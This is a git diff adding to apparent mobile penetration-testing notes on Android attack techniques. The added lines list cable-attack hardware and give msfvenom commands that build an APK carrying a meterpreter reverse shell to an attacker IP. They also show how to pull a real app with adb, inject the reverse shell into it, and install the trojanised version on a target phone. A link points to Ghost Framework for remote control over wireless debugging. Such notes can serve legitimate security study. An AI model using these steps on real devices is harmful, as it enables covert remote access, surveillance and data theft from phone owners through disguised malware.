@@ -246,6 +246,27 @@ critt@Mac workbench % objection explore --startup-script sslpinninguniversal.js
 
 
 ### Other concepts to keep in mind
-- In-line attacks
+- In-line attacks (cable attacks)
+	- [Hak5 O.M.G Cable](https://shop.hak5.org/products/omg-cable)
+	- [Hacker Warehouse](https://hackerwarehouse.com/product/omg-cable-elite/)
+- Creating a generic APK with a Metasploit shell
+	- `msfvenom -p android/meterpreter/reverse_tcp LHOST=<kali_IP> LPORT=<your_port> R><myapp.apk>`
+	- This will make an app with a generic looking icon named "Main Activity"
+	- Install it to your target phone: adb install myapp.apk
 - Injecting a production APK with a Metasploit shell
-- Ghost Framework
+	- If using apktool from the Kali-Repo, check version with command:
+		- `apktool -version` (if version is 2.x.x-dirty, you will need to remove it with the following commands, per [this article](https://github.com/iBotPeaches/Apktool/issues/2149))
+			1. `sudo apt remove apktool`
+			2. `sudo apt autoremove`
+			3. Then reinstall apktool from [ibotpeaches source, as shown here for Linux Machines]( [https://ibotpeaches.github.io/Apktool/install/](https://ibotpeaches.github.io/Apktool/install/))
+	- Automatic meterpreter injection:
+		1. Download app to your android device
+		2. Pull using adb
+			1. `pm list packages | grep <app_name>`
+			2. `pm path <app_package_name>`
+			3. exit adb shell, then `adb pull <path_to_apk/base.apk> -o <my_app.apk>`
+		3. After you have the apk, use the following msfvenom command to inject it automatically:
+		4. `msfvenom -x <my_app.apk> -p android/meterpreter/reverse_tcp LHOST=<kali_ip> LPORT=<my_port> -o <my_app_hacked.apk>`
+		5. Uninstall the app from the target device, and install the hacked version using adb install <my_app_hacked.apk>
+	- [Manual meterpreter embedding](https://www.blackhillsinfosec.com/embedding-meterpreter-in-android-apk/)
+- [Ghost Framework](https://github.com/ParikhKadam/ghost-1): leverages wireless debugging for remote admin
